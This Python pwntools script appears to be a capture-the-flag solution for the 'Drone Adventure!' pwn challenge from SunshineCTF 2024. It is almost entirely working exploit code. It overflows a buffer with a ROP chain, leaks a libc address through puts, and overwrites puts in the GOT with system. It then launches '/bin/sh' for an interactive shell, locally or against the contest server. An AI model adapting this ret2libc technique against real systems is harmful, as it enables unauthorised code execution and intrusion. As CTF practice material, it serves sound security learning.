#!/usr/bin/env python3
from pwn import *
import os
import sys

context.update(
    arch='amd64',
    endian='little',
    os='linux',
    log_level='debug',
    terminal=['tmux', 'split-window', '-h', '-p 65'],
)

REMOTE = False
TARGET = os.path.realpath('/ctf-writeups/SunshineCTF 2024/pwn/Drone Adventure!/drone.bin')
TARGET_LIBC = os.path.realpath('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF(TARGET)
libc = ELF(TARGET_LIBC)

def attach(r):
    if REMOTE:
        return

    bkps = []
    cmds = []

    gdb.attach(r, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))

def exploit(r):
    attach(r)

    rop = ROP(elf)

    rop.raw(cyclic(0x108))
    rop.call(elf.sym.puts, [elf.got.puts])
    rop.call(elf.sym.gets, [elf.got.puts])
    rop.call(elf.sym.gets, [elf.bss() + 0x400])
    rop.call(elf.sym.puts, [elf.bss() + 0x400])

    r.sendlineafter(b'>>> ', 'SAFE')
    r.sendlineafter(b'>>> ', 'N')

    r.sendlineafter(b'>>> ', 'CAMO')
    r.sendlineafter(b'>>> ', 'N')
    r.sendlineafter(b'>>> ', rop.chain())

    libc.address = u64(r.recvline().strip().ljust(8, b'\x00')) - libc.sym.puts

    r.sendline(p64(libc.sym.system))
    r.sendline(b'/bin/sh')
    r.interactive()
    return

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == 'remote':
        REMOTE = True
        r = remote('2024.sunshinectf.games', 24004)
    else:
        REMOTE = False
        r = process([TARGET,])

    exploit(r)
    exit(0)
